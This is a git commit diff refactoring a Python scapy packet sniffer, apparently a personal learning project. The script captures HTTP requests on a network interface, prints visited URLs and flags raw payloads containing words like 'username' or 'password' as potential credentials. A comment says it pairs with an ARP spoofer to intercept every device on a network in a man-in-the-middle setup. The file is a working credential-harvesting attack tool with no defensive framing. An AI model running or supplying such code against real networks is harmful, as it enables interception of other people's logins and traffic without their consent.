4ccd168b37f1442db76d458bff2c16c287adf4b2
Brenyn <brenynk@gmail.com>
2020-05-25 04:06:58 -0400

    refactoring code

--- packet_sniffer.py
+++ packet_sniffer.py
@@ -9,7 +9,7 @@
 # Input(s): Device to sniff
 # Output(s): Filters out relevant data
 #
-# Notes to self: Can be used with arp spoofer to read from all devices on a network
+# Notes to self: Can be used with arp spoofer to read from all devices on a network (man in the middle)
 #
 ##########################################################################################################
 
@@ -19,18 +19,25 @@ from scapy.layers import http #allows us to use http filters
 def sniff(interface):
 	scapy.sniff(iface = interface, store = False, prn = process_sniffed_packet)
 
+def get_url(packet):
+	return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
+
+def get_login(packet):
+	if packet.haslayer(scapy.Raw):
+		load = (packet[scapy.Raw].load) # only print from load inside of raw layer
+		keywords = ["username", "Username","user", "login", "password", "pass","Password"]
+		for keyword in keywords:
+			if keyword in load:
+				return load
+
 def process_sniffed_packet(packet):
 	if packet.haslayer(http.HTTPRequest):
-
 		#print(packet.show()) #show all fields in the packet
-		url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
+		url = get_url(packet)
 		print(url)
+		login_info = get_login(packet)
+		if login_info:
+			print("\n\n[+] Potential username/password:    " + login_info + "\n\n")
 
-		if packet.haslayer(scapy.Raw):
-			load = (packet[scapy.Raw].load) # only print from load inside of raw layer
-			keywords = ["username", "Username","user", "login", "password", "pass","Password"]
-			for keyword in keywords:
-				if keyword in load:
-					print(load)
-					break
+
 sniff("eth0")
